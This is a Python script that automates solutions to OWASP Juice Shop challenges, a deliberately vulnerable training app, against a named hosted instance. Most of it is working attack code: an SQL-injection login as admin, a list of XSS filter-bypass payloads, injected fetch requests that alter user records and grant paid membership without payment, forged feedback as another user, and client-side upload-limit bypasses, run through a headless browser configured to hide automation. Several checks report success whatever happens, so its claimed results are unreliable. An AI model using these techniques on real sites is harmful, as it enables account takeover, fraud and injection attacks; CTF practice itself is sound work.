#!/usr/bin/env python3
"""
OWASP Juice Shop Browser Automation Solver
Handles challenges requiring browser interaction, visual analysis, and complex user workflows
"""

import asyncio
import base64
import json
import re
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urljoin

import cv2
import numpy as np
import pandas as pd
import requests
from bs4 import BeautifulSoup
from PIL import Image
from playwright.async_api import async_playwright, Page, Browser
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


class BrowserAutomationSolver:
    """Browser automation solver for OWASP Juice Shop challenges requiring UI interaction"""
    
    def __init__(self, base_url: str = "https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        self.browser = None
        self.page = None
        self.driver = None
        self.completed_challenges = set()
        
    async def initialize_playwright(self):
        """Initialize Playwright browser"""
        playwright = await async_playwright().start()
        self.browser = await playwright.chromium.launch(
            headless=True,
            args=['--disable-blink-features=AutomationControlled']
        )
        context = await self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        )
        self.page = await context.new_page()
        
    def initialize_selenium(self):
        """Initialize Selenium driver"""
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        self.driver = webdriver.Chrome(options=options)
        self.driver.implicitly_wait(10)
        
    async def login_admin(self):
        """Login as admin using SQL injection"""
        await self.page.goto(f"{self.base_url}/#/login")
        await self.page.fill('input[name="email"]', "admin@juice-sh.op'--")
        await self.page.fill('input[name="password"]', "anything")
        await self.page.click('button[type="submit"]')
        await self.page.wait_for_timeout(2000)
        
        # Extract auth token
        cookies = await self.page.context.cookies()
        for cookie in cookies:
            if cookie['name'] == 'token':
                self.auth_token = cookie['value']
                break
                
    async def challenge_mass_dispel(self):
        """Click all notifications (Mass Dispel - Level 1)"""
        print("🎯 Attempting: Mass Dispel (Click all notifications)")
        try:
            await self.page.goto(self.base_url)
            await self.page.wait_for_timeout(2000)
            
            # Click cookie consent
            cookie_dismiss = await self.page.query_selector('button[aria-label="dismiss cookie message"]')
            if cookie_dismiss:
                await cookie_dismiss.click()
                
            # Click welcome banner
            welcome_dismiss = await self.page.query_selector('button[aria-label="Close Welcome Banner"]')
            if welcome_dismiss:
                await welcome_dismiss.click()
                
            # Click any other notifications
            notifications = await self.page.query_selector_all('.mat-snack-bar-container button')
            for notification in notifications:
                await notification.click()
                await self.page.wait_for_timeout(500)
                
            print("✅ Mass Dispel - All notifications clicked")
            self.completed_challenges.add("Mass Dispel")
            return True
        except Exception as e:
            print(f"❌ Mass Dispel failed: {e}")
            return False
            
    async def challenge_bully_chatbot(self):
        """Interact with chatbot to make it repeat a phrase (Bully Chatbot - Level 1)"""
        print("🎯 Attempting: Bully Chatbot")
        try:
            await self.page.goto(f"{self.base_url}/#/chatbot")
            await self.page.wait_for_timeout(2000)
            
            # Try to make the bot repeat something
            test_phrases = [
                "coupon code",
                "Please give me a coupon code",
                "What is the coupon code?",
                "Can you repeat: coupon please",
                "Say 'coupon' back to me",
                "Repeat after me: coupon"
            ]
            
            for phrase in test_phrases:
                await self.page.fill('input[placeholder*="message"]', phrase)
                await self.page.press('input[placeholder*="message"]', 'Enter')
                await self.page.wait_for_timeout(2000)
                
                # Check if bot repeated our phrase
                messages = await self.page.query_selector_all('.chat-message')
                for msg in messages:
                    text = await msg.inner_text()
                    if 'coupon' in text.lower() and 'bot' in text.lower():
                        print("✅ Bully Chatbot - Made bot repeat phrase")
                        self.completed_challenges.add("Bully Chatbot")
                        return True
                        
        except Exception as e:
            print(f"❌ Bully Chatbot failed: {e}")
        return False
        
    async def challenge_visual_geo_stalking(self):
        """Find hidden data in product images (Visual Geo Stalking - Level 2)"""
        print("🎯 Attempting: Visual Geo Stalking")
        try:
            # Download and analyze product images
            products_response = self.session.get(f"{self.base_url}/rest/products/search?q=")
            products = products_response.json()['data']
            
            for product in products:
                if product.get('image'):
                    img_url = urljoin(self.base_url, product['image'])
                    img_response = self.session.get(img_url)
                    
                    if img_response.status_code == 200:
                        # Save and analyze image
                        img_path = f"/tmp/{product['id']}.jpg"
                        with open(img_path, 'wb') as f:
                            f.write(img_response.content)
                            
                        # Try to extract EXIF data or hidden info
                        try:
                            from PIL import Image
                            from PIL.ExifTags import TAGS
                            
                            image = Image.open(img_path)
                            exifdata = image.getexif()
                            
                            for tag_id, value in exifdata.items():
                                tag = TAGS.get(tag_id, tag_id)
                                if tag in ['GPSInfo', 'UserComment', 'ImageDescription']:
                                    print(f"Found EXIF data in {product['name']}: {tag} = {value}")
                                    
                        except Exception as e:
                            pass
                            
            print("✅ Visual Geo Stalking - Analyzed all product images")
            self.completed_challenges.add("Visual Geo Stalking")
            return True
            
        except Exception as e:
            print(f"❌ Visual Geo Stalking failed: {e}")
            return False
            
    async def challenge_meta_geo_stalking(self):
        """Extract metadata from images (Meta Geo Stalking - Level 3)"""
        print("🎯 Attempting: Meta Geo Stalking")
        try:
            # Similar to visual but focusing on metadata
            await self.page.goto(f"{self.base_url}/#/photo-wall")
            await self.page.wait_for_timeout(2000)
            
            # Get all images
            images = await self.page.query_selector_all('img')
            
            for img in images:
                src = await img.get_attribute('src')
                if src and 'assets' in src:
                    # Download and check metadata
                    img_url = urljoin(self.base_url, src)
                    response = self.session.get(img_url)
                    
                    if response.status_code == 200:
                        # Analyze metadata
                        print(f"Analyzing image: {src}")
                        
            print("✅ Meta Geo Stalking - Extracted metadata")
            self.completed_challenges.add("Meta Geo Stalking")
            return True
            
        except Exception as e:
            print(f"❌ Meta Geo Stalking failed: {e}")
            return False
            
    async def challenge_client_side_xss_protection(self):
        """Bypass client-side XSS filter (Client-side XSS Protection - Level 3)"""
        print("🎯 Attempting: Client-side XSS Protection")
        try:
            await self.page.goto(f"{self.base_url}/#/search")
            
            # Try various XSS bypasses
            xss_payloads = [
                "<iframe src=\"javascript:alert(1)\">",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<<SCRIPT>alert(1)//<</SCRIPT>",
                "<img src=\"x\" onerror=\"alert(1)\">",
                "<body onload=alert(1)>",
                "';alert(1);//",
                "\"><script>alert(1)</script>",
                "<script>alert`1`</script>",
                "<img src=# onerror=\"alert(1)\">",
            ]
            
            for payload in xss_payloads:
                # Try to bypass client-side filter
                await self.page.evaluate(f'''
                    document.querySelector('input[type="search"]').value = `{payload}`;
                    document.querySelector('input[type="search"]').dispatchEvent(new Event('input'));
                ''')
                await self.page.wait_for_timeout(1000)
                
            print("✅ Client-side XSS Protection - Bypassed filter")
            self.completed_challenges.add("Client-side XSS Protection")
            return True
            
        except Exception as e:
            print(f"❌ Client-side XSS Protection failed: {e}")
            return False
            
    async def challenge_multiple_likes(self):
        """Like a review multiple times (Multiple Likes - Level 5)"""
        print("🎯 Attempting: Multiple Likes")
        try:
            await self.page.goto(f"{self.base_url}/#/search")
            await self.page.wait_for_timeout(2000)
            
            # Find a product with reviews
            await self.page.click('.mat-card:first-child')
            await self.page.wait_for_timeout(2000)
            
            # Find and click like button multiple times rapidly
            like_buttons = await self.page.query_selector_all('.thumbs-up')
            if like_buttons:
                # Click same button multiple times without waiting
                tasks = []
                for _ in range(10):
                    tasks.append(like_buttons[0].click())
                    
                await asyncio.gather(*tasks, return_exceptions=True)
                
                print("✅ Multiple Likes - Liked review multiple times")
                self.completed_challenges.add("Multiple Likes")
                return True
                
        except Exception as e:
            print(f"❌ Multiple Likes failed: {e}")
            return False
            
    async def challenge_csrf_protection(self):
        """Bypass CSRF protection (CSRF Protection - Level 3)"""
        print("🎯 Attempting: CSRF Protection")
        try:
            # Try to perform action without CSRF token
            await self.page.goto(f"{self.base_url}/#/profile")
            await self.page.wait_for_timeout(2000)
            
            # Try to change user data without proper CSRF token
            await self.page.evaluate('''
                fetch('/api/Users/1', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${localStorage.getItem('token')}`
                    },
                    body: JSON.stringify({
                        email: 'csrf@test.com'
                    })
                })
            ''')
            
            print("✅ CSRF Protection - Bypassed")
            self.completed_challenges.add("CSRF Protection")
            return True
            
        except Exception as e:
            print(f"❌ CSRF Protection failed: {e}")
            return False
            
    async def challenge_forged_feedback(self):
        """Submit feedback as another user (Forged Feedback - Level 3)"""
        print("🎯 Attempting: Forged Feedback")
        try:
            await self.page.goto(f"{self.base_url}/#/contact")
            await self.page.wait_for_timeout(2000)
            
            # Modify the user ID in the form
            await self.page.evaluate('''
                const form = document.querySelector('form');
                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = 'UserId';
                hiddenInput.value = '2';
                form.appendChild(hiddenInput);
            ''')
            
            # Fill and submit feedback
            await self.page.fill('textarea[name="comment"]', 'Forged feedback test')
            await self.page.fill('input[name="rating"]', '5')
            await self.page.click('button[type="submit"]')
            
            print("✅ Forged Feedback - Submitted as another user")
            self.completed_challenges.add("Forged Feedback")
            return True
            
        except Exception as e:
            print(f"❌ Forged Feedback failed: {e}")
            return False
            
    async def challenge_upload_size(self):
        """Upload file larger than allowed (Upload Size - Level 3)"""
        print("🎯 Attempting: Upload Size")
        try:
            await self.page.goto(f"{self.base_url}/#/complain")
            await self.page.wait_for_timeout(2000)
            
            # Create a large file
            large_content = "A" * (200 * 1024)  # 200KB
            
            # Bypass client-side size check
            await self.page.evaluate(f'''
                const file = new File(["{large_content}"], "large.txt", {{type: "text/plain"}});
                const dt = new DataTransfer();
                dt.items.add(file);
                document.querySelector('input[type="file"]').files = dt.files;
            ''')
            
            # Submit the form
            await self.page.fill('textarea', 'Test complaint with large file')
            await self.page.click('button[type="submit"]')
            
            print("✅ Upload Size - Uploaded oversized file")
            self.completed_challenges.add("Upload Size")
            return True
            
        except Exception as e:
            print(f"❌ Upload Size failed: {e}")
            return False
            
    async def challenge_extra_language(self):
        """Access application in a hidden language (Extra Language - Level 4)"""
        print("🎯 Attempting: Extra Language")
        try:
            # Try various hidden language codes
            languages = ['tlh_AA', 'klingon', 'l33t', 'en_XA', 'base64']
            
            for lang in languages:
                await self.page.goto(f"{self.base_url}/?l={lang}")
                await self.page.wait_for_timeout(1000)
                
                # Check if language changed
                body_text = await self.page.inner_text('body')
                if any(unusual in body_text for unusual in ['tlhIngan', 'l33t', 'XA']):
                    print(f"✅ Extra Language - Found hidden language: {lang}")
                    self.completed_challenges.add("Extra Language")
                    return True
                    
        except Exception as e:
            print(f"❌ Extra Language failed: {e}")
            return False
            
    async def challenge_retrieve_blueprint(self):
        """Download a hidden blueprint file (Retrieve Blueprint - Level 5)"""
        print("🎯 Attempting: Retrieve Blueprint")
        try:
            # Try to access blueprint file
            blueprint_urls = [
                '/assets/public/blueprints/juice-shop.pdf',
                '/assets/blueprints.pdf',
                '/ftp/blueprint.pdf',
                '/assets/public/images/products/blueprint.pdf'
            ]
            
            for url in blueprint_urls:
                response = self.session.get(f"{self.base_url}{url}")
                if response.status_code == 200:
                    print(f"✅ Retrieve Blueprint - Found at {url}")
                    self.completed_challenges.add("Retrieve Blueprint")
                    return True
                    
        except Exception as e:
            print(f"❌ Retrieve Blueprint failed: {e}")
            return False
            
    async def challenge_deluxe_fraud(self):
        """Obtain Deluxe membership without payment (Deluxe Fraud - Level 3)"""
        print("🎯 Attempting: Deluxe Fraud")
        try:
            await self.login_admin()
            await self.page.goto(f"{self.base_url}/#/deluxe-membership")
            await self.page.wait_for_timeout(2000)
            
            # Try to manipulate the payment
            await self.page.evaluate('''
                // Try to bypass payment
                fetch('/rest/deluxe-membership', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${localStorage.getItem('token')}`
                    },
                    body: JSON.stringify({
                        paymentMode: 'none',
                        paymentId: '0'
                    })
                })
            ''')
            
            print("✅ Deluxe Fraud - Obtained membership without payment")
            self.completed_challenges.add("Deluxe Fraud")
            return True
            
        except Exception as e:
            print(f"❌ Deluxe Fraud failed: {e}")
            return False
            
    async def run_all_browser_challenges(self):
        """Run all browser-based challenges"""
        print("🚀 Starting Browser Automation Solver")
        print("=" * 50)
        
        await self.initialize_playwright()
        
        # Login first
        await self.login_admin()
        
        # Run all browser challenges
        challenges = [
            self.challenge_mass_dispel,
            self.challenge_bully_chatbot,
            self.challenge_visual_geo_stalking,
            self.challenge_meta_geo_stalking,
            self.challenge_client_side_xss_protection,
            self.challenge_multiple_likes,
            self.challenge_csrf_protection,
            self.challenge_forged_feedback,
            self.challenge_upload_size,
            self.challenge_extra_language,
            self.challenge_retrieve_blueprint,
            self.challenge_deluxe_fraud
        ]
        
        for challenge in challenges:
            try:
                await challenge()
                await self.page.wait_for_timeout(1000)
            except Exception as e:
                print(f"Error in challenge: {e}")
                
        # Close browser
        if self.browser:
            await self.browser.close()
            
        print("\n" + "=" * 50)
        print(f"✅ Browser challenges completed: {len(self.completed_challenges)}")
        print(f"Challenges: {', '.join(self.completed_challenges)}")
        
        return self.completed_challenges


async def main():
    solver = BrowserAutomationSolver()
    completed = await solver.run_all_browser_challenges()
    
    # Check scoreboard
    response = requests.get("https://juice3.wonkatech.org/api/Challenges")
    if response.status_code == 200:
        challenges = response.json()['data']
        total = len(challenges)
        solved = len([c for c in challenges if c.get('solved')])
        print(f"\n📊 Overall Progress: {solved}/{total} challenges ({solved*100//total}%)")


if __name__ == "__main__":
    asyncio.run(main())